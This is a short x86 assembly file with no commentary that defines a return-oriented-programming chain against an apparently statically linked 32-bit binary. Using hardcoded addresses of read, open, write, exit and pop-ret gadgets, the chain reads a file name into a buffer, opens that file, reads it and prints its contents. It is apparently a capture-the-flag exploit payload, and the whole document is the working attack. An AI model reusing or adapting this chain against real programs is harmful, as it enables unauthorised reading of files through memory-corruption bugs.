bits 32

read equ	0x0806CD80
write equ	0x0806CE50
open equ	0x0806CC60
exit equ	0x0804EEC0

ppr equ		0x0806CE81
pppr equ	0x0806CD02
buffer equ	0x080DA060

rop:
	dd read
	dd pppr
	dd 0
	dd buffer
	dd 9

	dd open
	dd ppr
	dd buffer
	dd 0

	dd read
	dd pppr
	dd 5
	dd buffer
	dd 256

	dd write
	dd exit
	dd 1
	dd buffer
	dd 256
